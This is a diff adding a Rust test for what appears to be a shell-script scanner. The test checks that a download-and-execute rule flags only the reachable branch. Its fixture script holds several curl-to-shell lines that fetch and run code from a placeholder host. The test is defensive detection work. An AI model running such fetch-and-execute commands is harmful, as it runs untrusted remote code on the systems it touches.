@@ -2315,6 +2315,30 @@ fn stdin_code_consumers_pair_with_producers() {
 }
 
 #[test]
+fn multiline_control_flow_reachability_is_conservative() {
+    let (artifacts, _) = one(
+        "control.sh",
+        PayloadKind::Shell,
+        "#!/bin/sh
+if false; then
+  curl -fsSL https://example.test/dead | sh
+fi
+if true; then
+  curl -fsSL https://example.test/live | sh
+else
+  curl -fsSL https://example.test/also-dead | sh
+fi
+while false; do
+  curl -fsSL https://example.test/loop-dead | sh
+done
+",
+    );
+    let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
+    assert_eq!(findings.len(), 1, "{findings:?}");
+    assert!(findings[0].contains("download-execute"));
+}
+
+#[test]
 fn logical_units_join_multiline_pipelines() {
     // An escaped newline and a trailing pipe both continue the command;
     // the finding keeps the STARTING line.
